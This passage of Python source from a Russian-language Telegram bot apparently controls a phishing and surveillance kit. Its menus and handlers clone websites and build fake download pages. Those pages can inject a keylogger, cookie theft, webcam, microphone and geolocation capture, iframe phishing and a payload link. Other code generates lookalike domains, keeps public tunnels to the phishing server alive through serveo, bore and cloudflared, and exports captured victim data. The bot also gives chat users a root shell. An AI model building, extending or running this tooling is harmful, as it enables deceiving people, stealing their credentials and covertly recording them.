            reply_markup=kb([btn('🐳 Docker', 'rc_docker'), btn('🖥 RC Меню', 'rc_menu')]))

    elif action == 'rc_pty':
        answer_callback(cb_id)
        if role not in ('god', 'adm'): return
        already = pty_is_active(str(chat_id))
        if already:
            send_message(
                '🔧 <b>PTY сессия активна</b>\n\nВводи команды напрямую или закрой сессию.',
                chat_id,
                reply_markup=kb(
                    [btn('❌ Закрыть PTY', 'rc_pty_stop')],
                    [btn('🖥 RC Меню', 'rc_menu')]))
        else:
            ok = pty_start(str(chat_id))
            _wait_state[chat_id] = 'rc_pty'
            if ok:
                send_message(
                    '🔧 <b>PTY запущен</b> — интерактивная bash-сессия\n\n'
                    'Вводи команды. Ответ придёт в чат.\n'
                    '<code>/exit</code> — завершить',
                    chat_id,
                    reply_markup=kb([btn('❌ Закрыть PTY', 'rc_pty_stop')]))
            else:
                send_message('❌ Не удалось запустить PTY', chat_id)

    elif action == 'rc_pty_stop':
        answer_callback(cb_id)
        _wait_state.pop(chat_id, None)
        pty_stop(str(chat_id))
        send_message('🔧 PTY закрыт.', chat_id,
            reply_markup=kb([btn('🖥 RC Меню', 'rc_menu'), btn('◀️ Меню', 'menu')]))

    elif action == 'matrix_start':
        answer_callback(cb_id)
        if not MATRIX_ENABLED:
            send_message('❌ AGENT MATRIX не загружен. Проверь agent_matrix.py', chat_id); return
        _wait_state[chat_id] = 'matrix_task'
        try:
            tools = matrix_list_tools()
            dyn = [t['name'] for t in tools if not t.get('builtin')]
            dyn_info = f'\n🔧 Динамических инструментов: {len(dyn)}' if dyn else ''
        except Exception:
            dyn_info = ''
        edit_message(chat_id, msg_id,
            f'🟥 <b>AGENT MATRIX</b>\n\n'
            f'Универсальный агент: Кодер · Тестер · OSINT · Security Analyst\n'
            f'Умеет создавать свои инструменты и устанавливать с GitHub.{dyn_info}\n\n'
            f'Примеры:\n'
            f'• «Установи https://github.com/user/repo»\n'
            f'• «Найди все открытые порты 127.0.0.1»\n'
            f'• «Напиши и протестируй парсер hh.ru»\n'
            f'• «Проверь SSL сертификат example.com»\n'
            f'• «OSINT по username hacker123»\n\n'
            f'Напиши задачу:',
            reply_markup=kb([btn('❌ Отмена', 'menu')]))

    elif action == 'neo_stop':
        answer_callback(cb_id)
        _wait_state.pop(chat_id, None)
        edit_message(chat_id, msg_id,
            '🟢 NEO сессия завершена.',
            reply_markup=kb([btn('🟢 Новая задача', 'neo_start'),
                             btn('◀️ Меню', 'menu')]))

    elif action == 'neo_start':
        answer_callback(cb_id)
        if not NEO_ENABLED:
            send_message('❌ AGENT NEO не загружен. Проверь agent_neo.py', chat_id); return
        _wait_state[chat_id] = 'neo_task'
        try:
            tools = neo_list_tools()
            dyn = [t['name'] for t in tools if not t.get('builtin')]
            dyn_info = f'\n💾 Сохранённых инструментов: {len(dyn)}' if dyn else ''
        except Exception:
            dyn_info = ''
        pf_neo = _pending_file.get(chat_id)
        file_hint = ''
        if pf_neo and pf_neo.get('path'):
            file_hint = f'\n\n📎 Файл готов: <b>{pf_neo.get("filename","файл")}</b>'
        edit_message(chat_id, msg_id,
            f'🟢 <b>AGENT NEO</b>\n\n'
            f'Автономный агент — если нужного инструмента нет, '
            f'NEO сгенерирует его сам.{dyn_info}{file_hint}\n\n'
            f'Примеры:\n'
            f'• «Начни парсинг Telegram группы»\n'
            f'• «Сделай отчёт по вакансиям с hh.ru»\n'
            f'• «Отправь отчёт на email@example.com»\n'
            f'• «Нарисуй анимацию матрица в GIF»\n\n'
            f'Напиши задачу:',
            reply_markup=kb([btn('❌ Отмена', 'menu')]))



    elif action.startswith('brain_fb:'):
        answer_callback(cb_id)
        # RLHF feedback handler: brain_fb:like|dislike:<key>
        parts = action.split(':', 2)  # ['brain_fb', 'like'/'dislike', 'key']
        if len(parts) == 3:
            vote = parts[1]   # 'like' or 'dislike'
            fb_key = parts[2]
            score = 1 if vote == 'like' else -1
            entry = _brain_tasks.get(fb_key, {})
            if entry:
                try:
                    from core.agent_brain import Brain
                    Brain.feedback(
                        chat_id=str(chat_id),
                        agent=entry.get('agent', ''),
                        task=entry.get('task', ''),
                        answer=entry.get('answer', ''),
                        score=score,
                    )
                    _brain_tasks.pop(fb_key, None)
                    icon = '\U0001f44d' if score == 1 else '\U0001f44e'
                    send_message(f'{icon} \u0421\u043f\u0430\u0441\u0438\u0431\u043e! \u0410\u0433\u0435\u043d\u0442 \u0443\u0447\u0442\u0451\u0442 \u044d\u0442\u043e.', chat_id)
                except Exception as e:
                    send_message(f'\u274c feedback error: {e}', chat_id)
            else:
                send_message('\u26a0\ufe0f \u0417\u0430\u0434\u0430\u0447\u0430 \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d\u0430 (\u0443\u0441\u0442\u0430\u0440\u0435\u043b\u0430?)', chat_id)

    elif action == 'morpheus_start' or action.startswith('morpheus_mode:'):
        answer_callback(cb_id)
        _morph_priv = 'user'
        try:
            from auth_module import get_user_privilege as _gup
            _morph_priv = _gup(chat_id) or _morph_priv
        except Exception:
            pass
        if _morph_priv not in ('god', 'owner', 'adm'):
            send_message('\U0001f6ab AGENT MORPHEUS \u0434\u043e\u0441\u0442\u0443\u043f\u0435\u043d \u0442\u043e\u043b\u044c\u043a\u043e \u0432\u043b\u0430\u0434\u0435\u043b\u044c\u0446\u0443 \u0441\u0438\u0441\u0442\u0435\u043c\u044b.', chat_id)
            return
        mode_hint = action.split(':', 1)[1] if ':' in action else 'auto'
        _wait_state[chat_id] = f'morpheus_task:{mode_hint}'
        edit_message(chat_id, msg_id,
            '\U0001f535 <b>AGENT MORPHEUS</b>\n'
            '<i>Root-\u0430\u0433\u0435\u043d\u0442 \u00b7 Owner only</i>\n\n'
            '\u2705 \u0414\u043e\u0441\u0442\u0443\u043f: apt, pip, docker, shell, systemctl, git\n'
            '\u2705 \u0410\u0432\u0442\u043e-\u0444\u0438\u043a\u0441 \u0437\u0430\u0432\u0438\u0441\u0438\u043c\u043e\u0441\u0442\u0435\u0439\n'
            '\u2705 \u041a\u043b\u043e\u043d\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435 GitHub + Docker deploy\n\n'
            '\u2709\ufe0f \u041d\u0430\u043f\u0438\u0448\u0438 \u043a\u043e\u043c\u0430\u043d\u0434\u0443 \u0438\u043b\u0438 \u0437\u0430\u0434\u0430\u0447\u0443:',
            reply_markup=kb([
                [btn('\U0001f535 Shell', 'morpheus_mode:shell'),
                 btn('\U0001f4e6 APT/PIP', 'morpheus_mode:apt')],
                [btn('\U0001f433 Docker', 'morpheus_mode:docker'),
                 btn('\U0001f4e5 GitHub Repo', 'morpheus_mode:repo')],
                [btn('\u274c \u041e\u0442\u043c\u0435\u043d\u0430', 'menu')],
            ]))

    elif action == 'agent_stop_code':
        answer_callback(cb_id)
        _wait_state.pop(chat_id, None)
        try:
            from agent_session import close_session
            close_session(chat_id)
        except Exception:
            pass
        edit_message(chat_id, msg_id,
            "🔴 <b>Сессия агента завершена</b>\n\nМожешь начать новую задачу.",
            reply_markup=menu_keyboard(chat_id))

    elif action == 'sysinfo':
        answer_callback(cb_id)
        nav_el = navEl('sys') if False else None
        from admin_module import get_system_info
        try:
            info = get_system_info()
        except Exception as e:
            info = f"❌ {e}"
        send_message(f"🖥 <b>Система</b>\n\n{info}", chat_id,
                     reply_markup=kb([btn("◀️ Меню","menu")]))

    elif action == 'auto':
        # auto — запускаем агент в режиме auto
        answer_callback(cb_id)
        from agent_session import create_session, close_session, STAGE_WAIT_FILES
        close_session(chat_id)
        sess = create_session(chat_id)
        sess.stage = STAGE_WAIT_FILES
        _wait_state[chat_id] = 'code_session'
        send_message(
            "🤖 <b>Авто-режим</b>\n\nПиши что хочешь — агент определит тип задачи сам.\n\n"
            "<i>Сессия активна до нажатия стоп</i>",
            chat_id,
            reply_markup=kb([btn("🔴 Стоп","agent_stop_code")]))
        answer_callback(cb_id)
        try:
            from agent_tools_registry import _TOOLS, registry_stats
            stats = registry_stats()
            cats = {}
            for t in _TOOLS.values():
                cats.setdefault(t.category, []).append(t.name)
            lines = ["🔧 <b>Инструменты агента</b>\n",
                     f"Всего: <b>{stats.get('total',0)}</b>\n"]
            for cat, names in sorted(cats.items()):
                lines.append(f"<b>{cat}</b>: {', '.join(names[:5])}"
                              + (f" +{len(names)-5}" if len(names)>5 else ""))
        except Exception as e:
            lines = [f"❌ Инструменты не загружены: {e}"]
        edit_message(chat_id, msg_id, "\n".join(lines),
                     reply_markup=kb([btn("◀️ Меню", "menu")]))

    elif action == 'menu_tools':
        answer_callback(cb_id)
        try:
            from agent_tools_registry import _TOOLS, registry_stats
            stats  = registry_stats()
            cats   = {}
            for t in _TOOLS.values():
                cats.setdefault(t.category, []).append(t.name)
            lines = [f"🔧 <b>Инструменты агента</b>  ({stats.get('total',0)} шт.)\n"]
            for cat, names in sorted(cats.items()):
                n_str = ', '.join(f"<code>{n}</code>" for n in names[:4])
                extra = f" +{len(names)-4}" if len(names) > 4 else ""
                lines.append(f"<b>{cat}</b>: {n_str}{extra}")
        except Exception as e:
            lines = [f"❌ {e}"]
        edit_message(chat_id, msg_id, "\n".join(lines),
                     reply_markup=kb([btn("◀️ Меню", "menu")]))

    elif action == 'fish_preset':
        answer_callback(cb_id)
        if not FISH_ENABLED:
            send_message("❌ Фишинг не загружен", chat_id); return
        presets = {
            'geo':  {'inject_geo':True,  'inject_camera':False,'inject_mic':False},
            'cam':  {'inject_geo':False, 'inject_camera':True, 'inject_mic':False},
            'mic':  {'inject_geo':False, 'inject_camera':False,'inject_mic':True},
            'all':  {'inject_geo':True,  'inject_camera':True, 'inject_mic':True},
        }
        opts = presets.get(arg, {})
        if opts:
            try:
                import fish_bot_state as _fbs
                for k, v in opts.items():
                    setattr(_fbs, k, v)
                labels = {'geo':'📍 Гео','cam':'📸 Камера','mic':'🎤 Микрофон','all':'📦 Всё'}
                send_message(f"✅ Пресет <b>{labels.get(arg,arg)}</b> применён",
                             chat_id, reply_markup=fish_menu_keyboard())
            except Exception as e:
                send_message(f"⚠️ {e}", chat_id)

    # fish short-actions (cam/geo/mic/iframe/cookies/keylogger)
    elif action in ('cam','geo','mic','iframe','cookies','keylogger'):
        answer_callback(cb_id)
        if FISH_ENABLED:
            _fish_handle_action(action, chat_id)
        else:
            send_message("❌ Фишинг не загружен", chat_id)

    elif action == 'pay_fine':
        answer_callback(cb_id)
        fine = int(os.environ.get('BAN_FINE_AMOUNT', '0'))
        if fine == 0:
            send_message("💰 Штраф не установлен. Обратись к администратору.", chat_id)
        else:
            send_message(
                f"💰 <b>Оплатить штраф</b>\n\n"
                f"Сумма: <b>{fine}</b> кредитов\n\n"
                f"После оплаты свяжись с администратором для разблокировки.\n\n"
                f"<i>Разблокировку выполняет ADM или GOD</i>",
                chat_id,
                reply_markup=kb([btn("💳 Биллинг", "billing:status")])
            )

    elif action == 'profile':
        answer_callback(cb_id)
        update_last_seen(chat_id)
        text = format_profile(int(chat_id))
        edit_message(chat_id, msg_id, text,
                     reply_markup=kb(
                         [btn("🔄 Обновить",         "profile"),
                          btn("🏆 Рейтинг",          "profile_leaderboard")],
                         [btn("◀️ Главное меню",     "menu")],
                     ))

    elif action == 'profile_leaderboard':
        answer_callback(cb_id)
        users  = get_all_users()
        active = [u for u in users if u.get('status') == 'active'][:10]
        if not active:
            edit_message(chat_id, msg_id, "📭 Пока нет активных пользователей.",
                         reply_markup=kb([btn("◀️ Профиль","profile")]))
        else:
            lines  = ["🏆 <b>Таблица рейтинга</b>\n"]
            medals = ['🥇','🥈','🥉']
            for i, u in enumerate(active):
                icon      = medals[i] if i < 3 else f"{i+1}."
                login     = u.get('login') or '—'
                rating    = u.get('rating') or 0
                priv      = u.get('privilege') or 'user'
                priv_icon = PRIVILEGE_ICONS.get(priv,'👤')
                lines.append(f"{icon}  <b>{login}</b>  {priv_icon}  — {rating} очков")
            edit_message(chat_id, msg_id, "\n".join(lines),
                         reply_markup=kb([btn("👤 Мой профиль","profile"),
                                          btn("◀️ Меню","menu")]))

    else:
        answer_callback(cb_id, "❓ Неизвестная кнопка: {}".format(action), alert=True)



# ════════════════════════════════════════════════════════════
#  🎣 ФИШИНГ-МОДУЛЬ — меню, клавиатуры, хэндлеры
# ════════════════════════════════════════════════════════════

def fish_menu_keyboard():
    """Главное меню фишинг-модуля."""
    if not FISH_ENABLED:
        return kb([btn("❌ Модуль недоступен", "noop")])

    active_info = fish_downloader.get_active_page_info()

    # ── Статусы всех тоннелей ──────────────────────────────────────
    def _alive(proc):
        return proc is not None and proc.poll() is None

    cf_str     = "🟢 CF"     if _alive(fish_bot_state.tunnel_process)  else "🔴 CF"
    bore_str   = "🟢 bore"   if _alive(fish_bot_state.bore_process)    else "🔴 bore"
    ngrok_str  = "🟢 ngrok"  if _alive(fish_bot_state.ngrok_process)   else "🔴 ngrok"
    serveo_str = "🟢 serveo" if _alive(fish_bot_state.serveo_process)  else "🔴 serveo"

    # ── Flask-сервер ───────────────────────────────────────────────
    srv_act  = "fish:server_stop"  if fish_bot_state.server_running else "fish:server_start"
    srv_str  = "🟢 сервер :{}".format(_fish_cfg.SERVER_PORT) if fish_bot_state.server_running \
               else "🔴 сервер :{}".format(_fish_cfg.SERVER_PORT)

    # Активная страница
    # get_active_page_info() → (page_id, url, type) или None
    if active_info is None:
        active_info = fish_downloader.get_active_page_info()
    if active_info:
        _ai_url = active_info[1] if len(active_info) > 1 else ''
        active_label = "🟢 стр: {}".format(str(_ai_url)[:22])
    else:
        active_label = "⚪ стр не выбрана"

    return kb(
        # ── Заголовок ─────────────────────────────────────────────
        [btn("═══ 🎣 ФИШИНГ ═══",        "noop")],
        # ── Загрузка страниц ──────────────────────────────────────
        [btn("📥 URL-страница",           "fish:load"),
         btn("🌐 Весь сайт",              "fish:fullsite")],
        [btn("📍 +Гео",                   "fish:load_geo"),
         btn("📸 +Камера",                "fish:load_cam"),
         btn("🎤 +Микро",                 "fish:load_mic")],
        # ── Файлы и страница скачивания ───────────────────────────
        [btn("═══ 📁 ФАЙЛЫ ═══",          "noop")],
        [btn("📤 Загрузить файл",         "fish:upload"),
         btn("📂 Мои файлы",              "fish:files")],
        [btn("🌐 Загрузить HTML",         "fish:upload_html"),
         btn("📄 Создать стр. скачивания","fish:create_dl")],
        [btn("💣 Payload URL",            "fish:payload")],
        # ── Данные ────────────────────────────────────────────────
        [btn("═══ 📊 ДАННЫЕ ═══",         "noop")],
        [btn("📚 Страницы",               "fish:pages"),
         btn("📊 Статистика",             "fish:stats")],
        [btn("📸 Фото с вебки",           "fish:photos"),
         btn("🎵 Аудио записи",           "fish:audios")],
        [btn("🗺 Карта гео",              "fish:map"),
         btn("📤 Экспорт CSV",            "fish:export")],
        # ── Сервер ────────────────────────────────────────────────
        [btn("═══ 🌐 СЕРВЕР ═══",         "noop")],
        [btn(srv_str,                      srv_act),
         btn("🔄 Рестарт",                "fish:server_restart")],
        [btn(active_label,                 "fish:pages")],
        # ── Тоннели ───────────────────────────────────────────────
        [btn("═══ 🕳 ТОННЕЛИ ═══",        "noop")],
        [btn("{} {}".format(
                 "☁️" if (shutil.which("cloudflared") and not _is_termux()) else "🕳",
                 cf_str),                  "fish:tunnel"),
         btn("🛑",                         "fish:stop_tunnel"),
         btn("🕳 {}".format(bore_str),     "fish:bore_start"),
         btn("🛑",                         "fish:bore_stop")],
        [btn("🔌 {}".format(ngrok_str),    "fish:ngrok_start"),
         btn("🛑",                         "fish:ngrok_stop"),
         btn("🔑 {}".format(serveo_str),   "fish:serveo_start"),
         btn("🛑",                         "fish:serveo_stop")],
        # ── Утилиты ───────────────────────────────────────────────
        [btn("═══ 🛠 УТИЛИТЫ ═══",        "noop")],
        [btn("🔀 Похожий домен",           "fish:gen_domain"),
         btn("📱 QR-код",                  "fish:qr")],
        [btn("🧹 Очистить логи",           "fish:clear_logs"),
         btn("ℹ️ Статус",                 "fish:status")],
        [back_btn()],
    )


def _is_termux():
    """
    Определяем Android/Termux-окружение.

    На Android без root Go-бинарники (cloudflared) читают /etc/resolv.conf
    который указывает на [::1]:53 — внутренний DNS-демон Android.
    Этот демон недоступен снаружи официальных приложений, поэтому
    Go-резолвер всегда получает "connection refused".

    Python при этом использует Android libc через socket.getaddrinfo —
    и у него DNS работает нормально. Именно поэтому _dns_resolves()
    даёт ложноположительный результат: Python видит DNS, Go — нет.

    Признак Termux — каталог /data/data/com.termux или PREFIX в окружении.
    """
    if os.path.isdir("/data/data/com.termux"):
        return True
    prefix = os.environ.get("PREFIX", "")
    if "com.termux" in prefix:
        return True
    return False


def _is_windows():
    """Определяем Windows-окружение."""
    import sys as _sys
    return _sys.platform == 'win32'


def _windows_install_cloudflared():
    """
    Скачивает cloudflared.exe для Windows и кладёт рядом со скриптом.
    Вызывается автоматически если cloudflared не найден в PATH.
    """
    import urllib.request, os, sys, stat
    script_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
    dest = os.path.join(script_dir, 'cloudflared.exe')

    # Если уже есть рядом со скриптом — добавляем папку в PATH
    if os.path.isfile(dest):
        os.environ['PATH'] = script_dir + os.pathsep + os.environ.get('PATH', '')
        print("cloudflared: найден в {}".format(dest), flush=True)
        return

    url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
    print("cloudflared: скачиваю {} → {}".format(url, dest), flush=True)
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=60) as resp, open(dest, 'wb') as f:
            total = int(resp.headers.get('Content-Length', 0))
            downloaded = 0
            while True:
                chunk = resp.read(65536)
                if not chunk:
                    break
                f.write(chunk)
                downloaded += len(chunk)
                if total:
                    pct = downloaded * 100 // total
                    print(f"cloudflared: {pct}%", end="\r", flush=True)
        print("cloudflared: ✅ скачан ({:.1f} MB)".format(downloaded / 1024 / 1024), flush=True)
        # Добавляем папку в PATH текущего процесса
        os.environ['PATH'] = script_dir + os.pathsep + os.environ.get('PATH', '')
    except Exception as e:
        print("cloudflared: ❌ не удалось скачать — {}".format(e), flush=True)


def _pip_flags():
    """Флаги pip — --break-system-packages только для Termux."""
    return ['--break-system-packages'] if _is_termux() else []


def _disk_free_mb(path=None):
    """Свободное место на диске в MB — работает на всех ОС."""
    import shutil as _sh
    try:
        usage = _sh.disk_usage(path or os.path.expanduser('~'))
        return usage.free // 1024 // 1024
    except Exception:
        return None


def _ram_info_mb():
    """Возвращает (total_mb, available_mb) или None."""
    try:
        import psutil
        mem = psutil.virtual_memory()
        return mem.total // 1024 // 1024, mem.available // 1024 // 1024
    except Exception:
        pass
    try:
        total, avail = None, None
        with open('/proc/meminfo') as f:
            for line in f:
                if line.startswith('MemTotal:'):
                    total = int(line.split()[1]) // 1024
                elif line.startswith('MemAvailable:'):
                    avail = int(line.split()[1]) // 1024
                if total and avail:
                    break
        return total, avail
    except Exception:
        return None


def _dns_resolves(hostname, timeout=3):
    """
    Быстрая проверка: резолвится ли hostname через системный DNS.
    Использует socket.getaddrinfo — тот же путь что и большинство
    нативных бинарников (включая Go при GODEBUG=netdns=cgo).
    Возвращает True если хотя бы один IP найден за timeout секунд.
    """
    import socket
    import concurrent.futures
    def _resolve():
        return socket.getaddrinfo(hostname, None)
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=1) as ex:
            fut = ex.submit(_resolve)
            fut.result(timeout=timeout)
        return True
    except Exception:
        return False


def _fix_tunnel_dns():
    """
    Пытается прописать IP Cloudflare в /etc/hosts чтобы Go-резолвер
    нашёл домен без DNS-запроса (при GODEBUG=netdns=go).

    На Android без root /etc/hosts — read-only. Поэтому пробуем
    несколько путей, в том числе хардкодированный путь Termux
    (не полагаемся на $PREFIX — он может быть не установлен
    когда бот запущен не из интерактивного терминала).

    Возвращает True если запись удалась хотя бы в один файл.
    """
    cf_entries = [
        "104.16.230.132 api.trycloudflare.com",
        "104.16.231.132 api.trycloudflare.com",
    ]
    candidates = [
        # Termux — хардкод, не полагаемся на $PREFIX
        "/data/data/com.termux/files/usr/etc/hosts",
        # Termux через $PREFIX на случай нестандартной установки
        os.path.join(os.environ.get("PREFIX", "/nonexistent"), "etc", "hosts"),
        # Системный — обычно read-only, но вдруг root
        "/etc/hosts",
    ]
    # Убираем дубликаты (если $PREFIX не установлен, первые два совпадут)
    seen, unique = set(), []
    for p in candidates:
        if p not in seen:
            seen.add(p)
            unique.append(p)

    for hosts_path in unique:
        if not os.path.exists(os.path.dirname(hosts_path)):
            continue
        try:
            try:
                with open(hosts_path, "r") as f:
                    existing = f.read()
            except Exception:
                existing = ""
            additions = [e for e in cf_entries if e.split()[1] not in existing]
            if not additions:
                print("DNS fix: {} уже содержит нужные записи".format(hosts_path), flush=True)
                return True
            with open(hosts_path, "a") as f:
                f.write("\n# cloudflared DNS fix (auto)\n")
                f.write("\n".join(additions) + "\n")
            print("DNS fix: OK — записано в {}".format(hosts_path), flush=True)
            return True
        except Exception as e:
            print("DNS fix: {} — {}".format(hosts_path, e), flush=True)

    print("DNS fix: не удалось записать ни в один hosts-файл", flush=True)
    return False


def _fish_start_cloudflared():
    """
    Запускает тоннель и возвращает публичный URL или None.

    Порядок попыток:
      1. cloudflared — сначала делаем pre-flight DNS check через socket.
         Если DNS работает системно — запускаем. Если нет — пробуем
         hosts-фикс. Если и он недоступен (read-only Android) — пропускаем
         cloudflared совсем, без ожидания таймаута.
      2. bore — Rust/системный резолвер, не зависит от Go DNS quirks.
      3. SSH → serveo.net.
    """
    port = _fish_cfg.SERVER_PORT
    cf_host = "api.trycloudflare.com"

    # ── 1. cloudflared ────────────────────────────────────────────────
    # На Android/Termux Go-бинарники используют собственный DNS-стек
    # который читает /etc/resolv.conf → [::1]:53 (недоступно без root).
    # Python при этом нормально резолвит через libc — поэтому проверка
    # через socket даёт ложноположительный результат. Детектируем Termux
    # и пропускаем cloudflared полностью, без попыток.
    # На Windows — автоматически скачиваем cloudflared если его нет
    if not shutil.which("cloudflared") and _is_windows():
        _windows_install_cloudflared()

    if shutil.which("cloudflared"):
        if _is_termux():
            print("cloudflared: пропущен (Android/Termux — Go-DNS недоступен без root)", flush=True)
        else:
            # Не Android — пробуем hosts-фикс на всякий случай, потом запускаем
            _fix_tunnel_dns()
            env = os.environ.copy()
            env["GODEBUG"] = "netdns=go"
            try:
                proc = subprocess.Popen(
                    ["cloudflared", "tunnel",
                     "--edge-ip-version", "4",
                     "--url", "http://localhost:{}".format(port)],
                    stdout=subprocess.DEVNULL, stderr=subprocess.PIPE,
                    text=True, bufsize=1, env=env,
                )
                fish_bot_state.tunnel_process = proc
                url_pat = r"https://[a-zA-Z0-9-]+\.trycloudflare\.com"
                for line in proc.stderr:
                    print("cloudflared:", line.rstrip(), flush=True)
                    m = re.search(url_pat, line)
                    if m:
                        fish_bot_state.tunnel_url = m.group(0)
                        return fish_bot_state.tunnel_url
                    if "connection refused" in line and ":53" in line:
                        print("cloudflared: DNS недоступен, переходим к bore", flush=True)
                        proc.terminate()
                        break
            except Exception as e:
                print("cloudflared error: {}".format(e), flush=True)

    # ── 2. bore ───────────────────────────────────────────────────────
    if shutil.which("bore"):
        try:
            proc = subprocess.Popen(
                ["bore", "local", str(port), "--to", "bore.pub"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1,
            )
            fish_bot_state.tunnel_process = proc
            # bore печатает: "listening at bore.pub:XXXXX"
            port_pat = r"bore\.pub:(\d+)"
            for line in proc.stdout:
                print("bore:", line.rstrip(), flush=True)
                m = re.search(port_pat, line)
                if m:
                    url = "http://bore.pub:{}".format(m.group(1))
                    fish_bot_state.tunnel_url = url
                    return url
        except Exception as e:
            print("bore error: {}".format(e), flush=True)

    # ── 3. SSH → serveo.net с авто-реконнектом ───────────────────────
    if shutil.which("ssh"):
        url_pat_s = r"https://[a-zA-Z0-9-]+\.serveo\.net"
        # Первый коннект — ловим URL
        for _attempt in range(3):
            try:
                proc = subprocess.Popen(
                    ["ssh",
                     "-o", "StrictHostKeyChecking=no",
                     "-o", "ServerAliveInterval=15",
                     "-o", "ServerAliveCountMax=3",
                     "-o", "ExitOnForwardFailure=yes",
                     "-R", "80:localhost:{}".format(port),
                     "serveo.net"],
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True, bufsize=1,
                )
                fish_bot_state.tunnel_process = proc
                tunnel_found = None
                for line in proc.stdout:
                    print("serveo:", line.rstrip(), flush=True)
                    ms = re.search(url_pat_s, line)
                    if ms:
                        tunnel_found = ms.group(0)
                        fish_bot_state.tunnel_url = tunnel_found
                        break
                if tunnel_found:
                    # Запускаем watchdog для авто-реконнекта в фоне
                    def _serveo_watchdog(_port=port, _pat=url_pat_s):
                        import time as _t
                        while True:
                            _t.sleep(5)
                            # Проверяем жив ли процесс
                            if fish_bot_state.tunnel_process is None:
                                break
                            ret = fish_bot_state.tunnel_process.poll()
                            if ret is not None:
                                print("serveo: упал ({}), перезапускаю...".format(ret), flush=True)
                                fish_bot_state.tunnel_url = None
                                _p2 = subprocess.Popen(
                                    ["ssh",
                                     "-o", "StrictHostKeyChecking=no",
                                     "-o", "ServerAliveInterval=15",
                                     "-o", "ServerAliveCountMax=3",
                                     "-o", "ExitOnForwardFailure=yes",
                                     "-R", "80:localhost:{}".format(_port),
                                     "serveo.net"],
                                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                    text=True, bufsize=1,
                                )
                                fish_bot_state.tunnel_process = _p2
                                for _line in _p2.stdout:
                                    print("serveo:", _line.rstrip(), flush=True)
                                    _ms = re.search(_pat, _line)
                                    if _ms:
                                        fish_bot_state.tunnel_url = _ms.group(0)
                                        break
                    import threading as _thr
                    _thr.Thread(target=_serveo_watchdog, daemon=True, name="serveo-watchdog").start()
                    return tunnel_found
            except Exception as e:
                print("serveo error (attempt {}): {}".format(_attempt+1, e), flush=True)
                import time as _ts; _ts.sleep(3)

    # Всё провалилось
    return None


def _fish_stop_tunnel():
    if fish_bot_state.tunnel_process:
        fish_bot_state.tunnel_process.terminate()
        fish_bot_state.tunnel_process = None
        fish_bot_state.tunnel_url = None

def _fish_show_options(chat_id, msg_id=None):
    """Показывает меню настроек инжекций с кнопками-переключателями."""
    opts = _fish_user_opts.get(chat_id, {})
    # Убедимся, что все ключи есть
    default_opts = {
        'geo': False, 'cam': False, 'mic': False, 'auto': False,
        'keylogger': False, 'steal_cookies': False, 'system_info': False,
        'iframe_phish': False, 'iframe_url': None,
    }
    for k, v in default_opts.items():
        opts.setdefault(k, v)

    def _btn(label, toggle):
        status = "✅" if opts.get(toggle, False) else "❌"
        return btn(f"{label} {status}", f"fish_opt:{toggle}")

    # Кнопки переключения опций
    rows = [
        [_btn("📍 Гео", "geo"), _btn("📸 Камера", "cam")],
        [_btn("🎤 Микрофон", "mic"), _btn("📥 Авто", "auto")],
        [_btn("⌨️ Кейлоггер", "keylogger"), _btn("🍪 Куки", "cookies")],
        [_btn("🖥️ Инфо", "sysinfo"), _btn("🔄 Iframe", "iframe")],
    ]
    # Предустановленные шаблоны
    rows.append([
        btn("📍 Только гео", "fish_preset:geo"),
        btn("📸 Только камера", "fish_preset:cam"),
    ])
    rows.append([
        btn("🎤 Только микрофон", "fish_preset:mic"),
        btn("📦 Всё", "fish_preset:all"),
    ])
    # Действия
    rows.append([
        btn("🚀 Создать страницу", "fish_opt:generate"),
        btn("❌ Отмена", "menu_fish"),
    ])

    text = (
        "🔧 <b>Настройки инжекций</b>\n\n"
        "Нажимай на опции, чтобы включить/выключить.\n"
        "Можно использовать готовые шаблоны."
    )
    if msg_id:
        edit_message(chat_id, msg_id, text, reply_markup=kb(*rows))
    else:
        send_message(text, chat_id, reply_markup=kb(*rows))


def _fish_send_options(chat_id):
    """Красивое меню настроек инжекций + предпросмотр URL страницы скачивания."""
    opts = _fish_user_opts.setdefault(chat_id, {
        'geo': False, 'cam': False, 'mic': False, 'auto': False,
        'keylogger': False, 'steal_cookies': False, 'system_info': False,
        'iframe_phish': False, 'iframe_url': None,
    })
    fid_data = _fish_user_data.get(chat_id, {})
    fid      = fid_data.get('file_id')
    files    = fish_db.get_all_files() if fid else []
    fi       = next((f for f in files if f['id'] == fid), None)
    fname    = fi['original_name'] if fi else '???'

    def _t(v): return "🟢" if v else "⚪"
    def _ob(label, key): return btn("{} {}".format(_t(opts.get(key, False)), label), "fish_opt:{}".format(key))

    # Считаем сколько инжекций включено
    active = sum(1 for k in ('geo','cam','mic','keylogger','steal_cookies','system_info','iframe_phish')
                 if opts.get(k))
    auto_dl = "🟢 авто-скачивание" if opts.get('auto') else "⚪ ручное"

    # Предпросмотр URL если сервер запущен
    preview_url = ""
    if fish_bot_state.server_running and fid:
        base = fish_bot_state.tunnel_url or "http://localhost:{}".format(_fish_cfg.SERVER_PORT)
        preview_url = "\n🔗 <code>{}/download/{}</code>".format(base, fid)

    send_message(
        "📄 <b>Страница скачивания</b>\n"
        "Файл: <b>{}</b>\n"
        "Инжекций активно: <b>{}</b>  |  {}{}\n\n"
        "<i>Переключай что нужно, затем жми 🚀 Создать</i>".format(
            fname, active, auto_dl, preview_url),
        chat_id,
        reply_markup=kb(
            [btn("═══ 📍 СЛЕЖКА ═══",    "noop")],
            [_ob("Геолокация",  "geo"),    _ob("Камера",   "cam")],
            [_ob("Микрофон",    "mic"),    _ob("Кейлоггер","keylogger")],
            [btn("═══ 🍪 ДАННЫЕ ═══",    "noop")],
            [_ob("Куки",        "cookies"), _ob("Инфо системы","sysinfo")],
            [_ob("Iframe фишинг","iframe"), _ob("Авто-скачивание","auto")],
            [btn("═══ ─────────── ═══",  "noop")],
            [btn("🚀 Создать страницу",  "fish_opt:generate"),
             btn("👁 Предпросмотр",      "fish:status")],
            [btn("❌ Отмена",             "menu_fish")],
        )
    )


